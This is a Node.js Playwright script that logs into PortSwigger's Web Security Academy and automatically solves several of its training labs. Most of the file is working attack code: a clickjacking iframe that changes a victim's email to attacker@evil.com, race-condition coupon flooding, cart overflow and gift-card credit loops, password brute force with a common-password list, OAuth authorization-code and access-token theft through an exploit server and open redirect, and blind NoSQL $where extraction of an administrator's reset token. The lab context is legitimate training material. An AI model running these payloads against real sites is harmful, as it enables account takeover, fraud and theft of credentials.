#!/usr/bin/env node
import { chromium } from "playwright";

const EMAIL = process.env.PORTSWIGGER_EMAIL;
const PASSWORD = process.env.PORTSWIGGER_PASSWORD;
if (!EMAIL || !PASSWORD) {
  console.error("Set PORTSWIGGER_EMAIL and PORTSWIGGER_PASSWORD env vars");
  process.exit(1);
}

const DELAY_BETWEEN_LABS = 15000;
const LAB_SPAWN_WAIT = 20000;
const APP = "https://portswigger.net";
const dryRun = process.argv.includes("--dry-run");

const LABS = [
  ["Forced OAuth profile linking", "/web-security/oauth/lab-oauth-forced-oauth-profile-linking", solveLab7],
  ["Stealing OAuth access tokens via an open redirect", "/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect", solveLab9],
];

async function main() {
  console.log("PortSwigger Playwright batch solver");
  if (dryRun) {
    LABS.forEach(([name, path], i) => { console.log(`${i + 1}. ${name} -> ${path}`); });
    return;
  }
  const browser = await chromium.launch({ headless: true, args: ["--no-sandbox"] });
  let solved = 0;
  for (let i = 0; i < LABS.length; i++) {
    const [name, path, solver] = LABS[i];
    const ctx = await browser.newContext({ viewport: { width: 1440, height: 960 } });
    const page = await ctx.newPage();
    console.log(`\n[${i + 1}/${LABS.length}] ${name}`);
    try {
      await loginAcademy(page);
      const labUrl = await launchLab(page, path);
      console.log(`  lab: ${labUrl}`);
      await solver(labUrl, page);
      const ok = await isSolved(page, labUrl);
      console.log(`  result: ${ok ? "SOLVED" : "NOT SOLVED"}`);
      if (ok) solved++;
    } catch (error) {
      console.log(`  error: ${String(error.message || error).slice(0, 240)}`);
    } finally {
      await ctx.close();
    }
    if (i < LABS.length - 1) await pageDelay(DELAY_BETWEEN_LABS);
  }
  await browser.close();
  console.log(`\nCompleted ${solved}/${LABS.length} labs`);
}

async function solveLab1(labUrl, page) {
  await labLogin(page, labUrl, "wiener", "peter");
  const exploitUrl = await getExploitServerUrl(page, labUrl);
  const body = `<style>iframe{position:relative;width:980px;height:700px;opacity:.0001;z-index:2}div{position:absolute;top:505px;left:68px;z-index:1;background:#0b5fff;color:#fff;padding:14px 28px;font:20px sans-serif;border-radius:8px}</style><div>Click me</div><iframe src="${labUrl}/my-account?email=attacker@evil.com"></iframe>`;
  await storeExploit(page, exploitUrl, body, true);
  const preview = await page.context().newPage();
  try {
    await preview.goto(exploitUrl, { waitUntil: "domcontentloaded", timeout: 15000 });
    await preview.getByText("Click me", { exact: true }).click({ timeout: 5000 });
    await preview.waitForTimeout(1500);
  } finally {
    await preview.close();
  }
}

async function solveLab2(labUrl, page) {
  const authUrl = await getOAuthLink(page, labUrl, "/login");
  await completeOAuth(page, authUrl);
  const current = new URL(page.url());
  const hash = new URLSearchParams(current.hash.replace(/^#/, ""));
  const query = current.searchParams;
  if (!hash.get("email") && !query.get("email")) {
    const t = hash.get("access_token") || query.get("access_token");
    if (t) hash.set("access_token", t);
  }
  if (hash.has("email")) hash.set("email", "carlos@carlos-montoya.net");
  if (query.has("email")) query.set("email", "carlos@carlos-montoya.net");
  const fixed = `${current.origin}${current.pathname}${query.toString() ? `?${query}` : ""}${hash.toString() ? `#${hash}` : ""}`;
  await page.goto(fixed, { waitUntil: "domcontentloaded", timeout: 20000 });
  await page.waitForTimeout(2000);
}

async function solveLab3(labUrl, page) {
  await labLogin(page, labUrl, "wiener", "peter");
  await addToCart(page, labUrl, 1, 1);
  await page.goto(labUrl + "/cart", { waitUntil: "domcontentloaded", timeout: 15000 });
  const csrf = await getCsrf(page);
  for (let attempt = 0; attempt < 4; attempt++) {
    const accepted = await page.evaluate(async (token) => {
      const jobs = Array.from({ length: 30 }, () => fetch("/cart/coupon", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: new URLSearchParams({ csrf: token, coupon: "PROMO20" }).toString() }).then((r) => r.status).catch(() => 0));
      return (await Promise.all(jobs)).filter((s) => s === 200).length;
    }, csrf);
    console.log(`  coupon attempt ${attempt + 1}: ${accepted}/30 accepted`);
    if (accepted > 1) break;
  }
  await checkout(page, labUrl);
}

async function solveLab4(labUrl, page) {
  await labLogin(page, labUrl, "wiener", "peter");
  const totalQty = 385487;
  let remaining = totalQty;
  while (remaining > 0) {
    const qty = Math.min(remaining, 99);
    await addToCart(page, labUrl, 1, qty);
    remaining -= qty;
    if (remaining % 9900 === 0) console.log(`  remaining quantity: ${remaining}`);
  }
  await checkout(page, labUrl);
}

async function solveLab5(labUrl, page) {
  await labLogin(page, labUrl, "wiener", "peter");
  let credit = await getStoreCredit(page, labUrl);
  for (let round = 0; round < 470 && credit < 1337; round++) {
    await addToCart(page, labUrl, 2, 1);
    await applyCoupon(page, labUrl, "SIGNUP30");
    await checkout(page, labUrl);
    const code = await extractGiftCardCode(page);
    if (!code) throw new Error("gift card code not found");
    await redeemGiftCard(page, labUrl, code);
    credit = await getStoreCredit(page, labUrl);
    if ((round + 1) % 25 === 0 || credit >= 1337) console.log(`  round ${round + 1}: credit $${credit.toFixed(2)}`);
  }
  await addToCart(page, labUrl, 1, 1);
  await checkout(page, labUrl);
}

async function solveLab6(labUrl, page) {
  const passwords = ["123456","password","12345678","qwerty","123456789","12345","1234","111111","1234567","dragon","123123","baseball","abc123","football","monkey","letmein","shadow","master","666666","qwertyuiop","123321","mustang","1234567890","michael","654321","superman","1qaz2wsx","7777777","121212","000000","qazwsx","123qwe","killer","trustno1","jordan","jennifer","zxcvbnm","asdfgh","hunter","buster","soccer","harley","batman","andrew","tigger","sunshine","iloveyou","2000","charlie","robert","thomas","hockey","ranger","daniel","starwars","klaster","112233","george","computer","michelle","jessica","pepper","1111","zxcvbn","555555","11111111","131313","freedom","777777","pass","maggie","159753","aaaaaa","ginger","princess","joshua","cheese","amanda","summer","love","ashley","nicole","chelsea","biteme","matthew","access","yankees","987654321","dallas","austin","thunder","taylor","matrix","mobilemail","mom","monitor","monitoring","montana","moon","moscow","montoya"];
  await page.goto(labUrl + "/login", { waitUntil: "domcontentloaded", timeout: 15000 });
  const csrf = await getCsrf(page);
  await page.evaluate(async ({ token, list }) => {
    const body = { username: "carlos", password: list };
    if (token) body.csrf = token;
    await fetch("/login", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(body), redirect: "follow" });
  }, { token: csrf, list: passwords });
  await page.goto(labUrl + "/my-account", { waitUntil: "domcontentloaded", timeout: 15000 });
}

async function solveLab7(labUrl, page) {
  await labLogin(page, labUrl, "wiener", "peter");
  await page.goto(labUrl + "/my-account", { waitUntil: "domcontentloaded", timeout: 15000 });
  const attachUrl = await findLink(page, /attach|link.*social|social.*profile/i);
  let captured = "";
  await page.context().route("**", async (route) => {
    const url = route.request().url();
    if (url.startsWith(labUrl) && /code=/.test(url)) {
      captured = url;
      await route.abort();
      return;
    }
    await route.continue();
  });
  await page.goto(attachUrl, { waitUntil: "domcontentloaded", timeout: 20000 });
  await finishSocialProviderAuth(page);
  await page.context().unroute("**");
  if (!captured) throw new Error("oauth linking code not captured");
  const exploitUrl = await getExploitServerUrl(page, labUrl);
  await storeExploit(page, exploitUrl, `<script>location='${captured.replace(/'/g, "%27")}'</script>`, true);
  const loginUrl = await getOAuthLink(page, labUrl, "/login");
  await completeOAuth(page, loginUrl);
  await deleteCarlos(page, labUrl);
}

async function solveLab8(labUrl, page) {
  const exploitUrl = await getExploitServerUrl(page, labUrl);
  const authUrl = new URL(await getOAuthLink(page, labUrl, "/login"));
  const originalRedirect = authUrl.searchParams.get("redirect_uri");
  const state = authUrl.searchParams.get("state") || "";
  authUrl.searchParams.set("redirect_uri", exploitUrl);
  await storeExploit(page, exploitUrl, `<script>location='${authUrl.href.replace(/'/g, "%27")}'</script>`, true);
  const code = await waitForExploitValue(page, exploitUrl, /[?&]code=([^&\s]+)/, 8);
  await page.goto(`${originalRedirect}${originalRedirect.includes("?") ? "&" : "?"}code=${encodeURIComponent(code)}${state ? `&state=${encodeURIComponent(state)}` : ""}`, { waitUntil: "domcontentloaded", timeout: 20000 });
  await deleteCarlos(page, labUrl);
}

async function solveLab9(labUrl, page) {
  const exploitUrl = await getExploitServerUrl(page, labUrl);
  await storeExploit(page, exploitUrl, `<script>if(location.hash){fetch('/?'+location.hash.slice(1))}</script>`, false);
  const authUrl = new URL(await getOAuthLink(page, labUrl, "/login"));
  const originalRedirect = authUrl.searchParams.get("redirect_uri");
  authUrl.searchParams.set("redirect_uri", `${labUrl}/post/next?path=${encodeURIComponent(exploitUrl)}`);
  await storeExploit(page, exploitUrl, `<script>location='${authUrl.href.replace(/'/g, "%27")}'</script>`, true);
  const token = await waitForExploitValue(page, exploitUrl, /[?&]access_token=([^&\s]+)/, 8);
  const me = await fetchOAuthProfile(page, authUrl.origin, token).catch(() => ({}));
  const callback = `${originalRedirect}#access_token=${encodeURIComponent(token)}&token_type=Bearer&expires_in=3600${me.email ? `&email=${encodeURIComponent(me.email)}` : ""}`;
  await page.goto(callback, { waitUntil: "domcontentloaded", timeout: 20000 });
  await deleteCarlos(page, labUrl);
}

async function solveLab10(labUrl, page) {
  await triggerReset(page, labUrl, "administrator");
  const fields = [];
  for (let i = 0; i < 8; i++) {
    const name = await extractWithOracle((prefix) => noSqlWhere(page, labUrl, `Object.keys(this)[${i}]&&Object.keys(this)[${i}].match(/^${escapeForWhere(prefix)}.*$/)`), "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_$", 24);
    if (!name) break;
    fields.push(name);
  }
  console.log(`  fields: ${fields.join(", ")}`);
  const tokenField = fields.find((name) => /token|reset|temp/i.test(name)) || fields.at(-1);
  if (!tokenField) throw new Error("reset token field not found");
  const token = await extractWithOracle((prefix) => noSqlWhere(page, labUrl, `this['${tokenField}']&&this['${tokenField}'].match(/^${escapeForWhere(prefix)}.*$/)`), "abcdefghijklmnopqrstuvwxyz0123456789", 40);
  if (!token) throw new Error("reset token extraction failed");
  await resetPassword(page, labUrl, token, "administrator", "hacked123!");
  await labLogin(page, labUrl, "administrator", "hacked123!");
  await deleteCarlos(page, labUrl);
}

async function loginAcademy(page) {
  await page.goto(APP + "/users", { waitUntil: "networkidle", timeout: 30000 });
  await page.fill("#EmailAddress", EMAIL);
  await page.fill("#Password", PASSWORD);
  await Promise.all([page.waitForNavigation({ timeout: 15000 }).catch(() => {}), page.click("#Login")]);
  await page.waitForTimeout(1500);
}

async function launchLab(page, path) {
  await page.goto(APP + path, { waitUntil: "networkidle", timeout: 30000 });
  const launch = await findLink(page, /access the lab|launch the lab/i, true);
  await page.goto(launch, { waitUntil: "domcontentloaded", timeout: 60000 });
  await page.waitForTimeout(LAB_SPAWN_WAIT);
  const labUrl = new URL(page.url()).origin;
  for (let i = 0; i < 12; i++) {
    try {
      const probe = await page.context().newPage();
      const resp = await probe.goto(labUrl, { waitUntil: "domcontentloaded", timeout: 10000 });
      await probe.close();
      if (resp && resp.status() < 500) return labUrl;
    } catch {}
    await page.waitForTimeout(2500);
  }
  throw new Error("lab did not become ready");
}

async function labLogin(page, labUrl, user, pass) {
  await page.goto(labUrl + "/login", { waitUntil: "domcontentloaded", timeout: 15000 });
  await page.fill('input[name="username"]', user);
  await page.fill('input[name="password"]', pass);
  await Promise.all([page.waitForNavigation({ timeout: 15000 }).catch(() => {}), page.click('button:has-text("Log in"), button[type="submit"], input[type="submit"]')]);
  await page.waitForTimeout(1200);
}

async function isSolved(page, labUrl) {
  await page.goto(labUrl, { waitUntil: "domcontentloaded", timeout: 15000 });
  const body = (await page.textContent("body").catch(() => "")) || "";
  return /congratulations/i.test(body);
}

async function getCsrf(page) {
  return page.locator('[name="csrf"]').first().inputValue().catch(() => "");
}

async function addToCart(page, labUrl, productId, quantity) {
  await page.goto(labUrl + "/", { waitUntil: "domcontentloaded", timeout: 15000 });
  await page.evaluate(async ({ productId, quantity }) => {
    await fetch("/cart", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: new URLSearchParams({ productId: String(productId), redir: "PRODUCT", quantity: String(quantity) }).toString() });
  }, { productId, quantity });
}

async function applyCoupon(page, labUrl, coupon) {
  await page.goto(labUrl + "/cart", { waitUntil: "domcontentloaded", timeout: 15000 });
  const csrf = await getCsrf(page);
  await page.evaluate(async ({ csrf, coupon }) => {
    await fetch("/cart/coupon", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: new URLSearchParams({ csrf, coupon }).toString() });
  }, { csrf, coupon });
}

async function checkout(page, labUrl) {
  await page.goto(labUrl + "/cart", { waitUntil: "domcontentloaded", timeout: 15000 });
  const csrf = await getCsrf(page);
  await page.evaluate(async (csrf) => {
    await fetch("/cart/checkout", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: new URLSearchParams({ csrf }).toString() });
  }, csrf);
  await page.waitForTimeout(1500);
}

async function getExploitServerUrl(page, labUrl) {
  await page.goto(labUrl, { waitUntil: "domcontentloaded", timeout: 15000 });
  const href = await page.evaluate(() => [...document.querySelectorAll('a[href]')].find((a) => /exploit server/i.test(a.textContent || "") || /exploit-server/i.test(a.href))?.href || null);
  if (!href) throw new Error("exploit server not found");
  return href;
}

async function storeExploit(page, exploitUrl, body, deliver) {
  await page.goto(exploitUrl, { waitUntil: "domcontentloaded", timeout: 15000 });
  const head = "HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8";
  await page.locator('textarea[name="responseHead"], textarea').first().fill(head).catch(() => {});
  await page.locator('textarea[name="responseBody"], #responseBody, textarea').last().fill(body);
  await page.getByRole("button", { name: /store/i }).click().catch(async () => page.click('input[value="Store"]'));
  await page.waitForTimeout(1200);
  if (deliver) {
    await page.getByRole("button", { name: /deliver exploit to victim|deliver/i }).click().catch(async () => page.click('input[value*="Deliver"]'));
    await page.waitForTimeout(2500);
  }
}

async function readExploitLog(page, exploitUrl) {
  await page.goto(exploitUrl, { waitUntil: "domcontentloaded", timeout: 15000 });
  const href = await page.evaluate(() => [...document.querySelectorAll('a[href]')].find((a) => /access log/i.test(a.textContent || "") || /\/log$/.test(a.getAttribute("href") || ""))?.href || null);
  await page.goto(href || `${exploitUrl}/log`, { waitUntil: "domcontentloaded", timeout: 15000 });
  return (await page.textContent("body").catch(() => "")) || "";
}

async function waitForExploitValue(page, exploitUrl, pattern, rounds) {
  for (let i = 0; i < rounds; i++) {
    const log = await readExploitLog(page, exploitUrl);
    const match = log.match(pattern);
    if (match) return decodeURIComponent(match[1]);
    await page.waitForTimeout(4000);
  }
  throw new Error("expected value not found in exploit log");
}

async function getOAuthLink(page, labUrl, sourcePath) {
  await page.goto(labUrl + sourcePath, { waitUntil: "domcontentloaded", timeout: 15000 });
  await page.waitForTimeout(2000);
  // Try multiple patterns - OAuth links can vary
  let href = await page.evaluate(() => {
    const links = [...document.querySelectorAll('a[href]')];
    // Find link that mentions oauth/social
    let l = links.find((a) => /oauth|social/i.test(a.href) || /social|oauth|log.in.*(social|oauth)/i.test(a.textContent || ""));
    if (l) return l.href;
    // Or form with action to oauth
    const forms = [...document.querySelectorAll('form')];
    l = forms.find(f => /oauth/i.test(f.action));
    if (l) return l.action;
    // Or meta refresh
    const meta = document.querySelector('meta[http-equiv="refresh" i]');
    const content = meta?.getAttribute('content') || '';
    const m = content.match(/url=(.*)$/i);
    if (m) return m[1];
    return null;
  });
  if (!href) {
    // Try social-login explicitly
    await page.goto(labUrl + '/social-login', { waitUntil: "domcontentloaded", timeout: 15000 }).catch(()=>{});
    await page.waitForTimeout(2000);
    const currentUrl = page.url();
    if (currentUrl.includes('oauth') || currentUrl.includes('auth?')) {
      return currentUrl;
    }
    // Check meta refresh again
    href = await page.evaluate(() => {
      const meta = document.querySelector('meta[http-equiv="refresh" i]');
      const content = meta?.getAttribute('content') || '';
      return content.match(/url=(.*)$/i)?.[1] || null;
    });
  }
  if (!href) throw new Error("oauth link not found");
  return href;
}

async function completeOAuth(page, authUrl) {
  await page.goto(authUrl, { waitUntil: "domcontentloaded", timeout: 20000 });
  await finishSocialProviderAuth(page);
  await page.waitForTimeout(1500);
}

async function finishSocialProviderAuth(page) {
  const user = page.locator('input[name="username"], #username, input[type="email"]').first();
  if (await user.count()) {
    await user.fill("wiener");
    await page.locator('input[name="password"], #password, input[type="password"]').first().fill("peter");
    await page.getByRole("button", { name: /log in|sign in|continue/i }).click().catch(async () => page.click('button[type="submit"], input[type="submit"]'));
  }
  const approve = page.getByRole("button", { name: /authorize|allow|continue/i });
  if (await approve.count()) await approve.first().click().catch(() => {});
  await page.waitForLoadState("domcontentloaded").catch(() => {});
}

async function fetchOAuthProfile(page, authOrigin, token) {
  return page.evaluate(async ({ authOrigin, token }) => {
    const r = await fetch(authOrigin + "/me", { headers: { Authorization: `Bearer ${token}` } });
    return r.json();
  }, { authOrigin, token });
}

async function deleteCarlos(page, labUrl) {
  await page.goto(labUrl + "/admin", { waitUntil: "domcontentloaded", timeout: 15000 });
  const link = page.locator('a[href*="delete"][href*="carlos"]').first();
  if (await link.count()) {
    await link.click();
    await page.waitForTimeout(1500);
  }
}

async function extractGiftCardCode(page) {
  const body = (await page.textContent("body").catch(() => "")) || "";
  return body.match(/(?:[A-Z0-9]{4}-){3}[A-Z0-9]{4}/)?.[0] || body.match(/[A-Z0-9]{16}/)?.[0] || "";
}

async function redeemGiftCard(page, labUrl, code) {
  await page.goto(labUrl + "/gift-card", { waitUntil: "domcontentloaded", timeout: 15000 }).catch(async () => page.goto(labUrl + "/my-account", { waitUntil: "domcontentloaded", timeout: 15000 }));
  const csrf = await getCsrf(page);
  const field = await page.evaluate(() => [...document.querySelectorAll('input[name]')].map((i) => i.name).find((n) => !/^csrf$/i.test(n) && !/password/i.test(n) && !/username/i.test(n)) || "gift-card");
  await page.evaluate(async ({ csrf, field, code }) => {
    const body = new URLSearchParams();
    if (csrf) body.set("csrf", csrf);
    body.set(field, code);
    await fetch("/gift-card", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: body.toString() });
  }, { csrf, field, code });
  await page.waitForTimeout(900);
}

async function getStoreCredit(page, labUrl) {
  await page.goto(labUrl + "/my-account", { waitUntil: "domcontentloaded", timeout: 15000 });
  const text = (await page.textContent("body").catch(() => "")) || "";
  const amount = text.match(/\$([\d,]+(?:\.\d{2})?)/g)?.map((v) => Number(v.replace(/[$,]/g, ""))) || [];
  return Math.max(0, ...amount);
}

async function triggerReset(page, labUrl, username) {
  await page.goto(labUrl + "/forgot-password", { waitUntil: "domcontentloaded", timeout: 15000 });
  const csrf = await getCsrf(page);
  await page.evaluate(async ({ csrf, username }) => {
    const body = new URLSearchParams({ username });
    if (csrf) body.set("csrf", csrf);
    await fetch("/forgot-password", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: body.toString() });
  }, { csrf, username });
  await page.waitForTimeout(800);
}

async function noSqlWhere(page, labUrl, whereClause) {
  await page.goto(labUrl + "/login", { waitUntil: "domcontentloaded", timeout: 15000 });
  const csrf = await getCsrf(page);
  const result = await page.evaluate(async ({ csrf, whereClause }) => {
    const body = new URLSearchParams();
    if (csrf) body.set("csrf", csrf);
    body.set("username", "administrator");
    body.set("password[$ne]", "x");
    body.set("$where", whereClause);
    const r = await fetch("/login", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: body.toString(), redirect: "follow" });
    return { url: r.url, text: await r.text() };
  }, { csrf, whereClause });
  const ok = /my-account|log out|your username is: administrator/i.test(`${result.url}\n${result.text}`);
  if (ok) await page.goto(labUrl + "/logout", { waitUntil: "domcontentloaded", timeout: 15000 }).catch(() => {});
  return ok;
}

async function extractWithOracle(checker, charset, maxLen) {
  let value = "";
  for (let i = 0; i < maxLen; i++) {
    let next = "";
    for (const ch of charset) {
      if (await checker(value + ch)) {
        next = ch;
        value += ch;
        break;
      }
    }
    if (!next) break;
  }
  return value;
}

async function resetPassword(page, labUrl, token, username, password) {
  await page.goto(`${labUrl}/forgot-password?temp-forgot-password-token=${encodeURIComponent(token)}`, { waitUntil: "domcontentloaded", timeout: 15000 });
  const csrf = await getCsrf(page);
  const names = await page.evaluate(() => [...document.querySelectorAll('input[name]')].map((i) => i.name));
  const body = new URLSearchParams();
  if (csrf) body.set("csrf", csrf);
  if (names.includes("temp-forgot-password-token")) body.set("temp-forgot-password-token", token);
  if (names.includes("username")) body.set("username", username);
  const pw1 = names.find((n) => /new-password-1|password-1|newPassword/i.test(n)) || names.find((n) => /password/i.test(n)) || "new-password-1";
  const pw2 = names.find((n) => /new-password-2|password-2|confirm/i.test(n)) || "new-password-2";
  body.set(pw1, password);
  body.set(pw2, password);
  await page.evaluate(async (qs) => {
    await fetch(location.pathname + location.search, { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: qs });
  }, body.toString());
  await page.waitForTimeout(1200);
}

async function findLink(page, pattern, absolute = false) {
  const href = await page.evaluate(({ source, absolute }) => {
    const regex = new RegExp(source, "i");
    const link = [...document.querySelectorAll('a[href]')].find((a) => regex.test(a.textContent || "") || regex.test(a.href));
    if (!link) return null;
    return absolute ? link.href : new URL(link.href, location.href).href;
  }, { source: pattern.source, absolute });
  if (!href) throw new Error(`link not found: ${pattern}`);
  return href;
}

function escapeForWhere(input) {
  return input.replace(/[\\^$.*+?()[\]{}|']/g, (m) => `\\${m}`);
}

function pageDelay(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
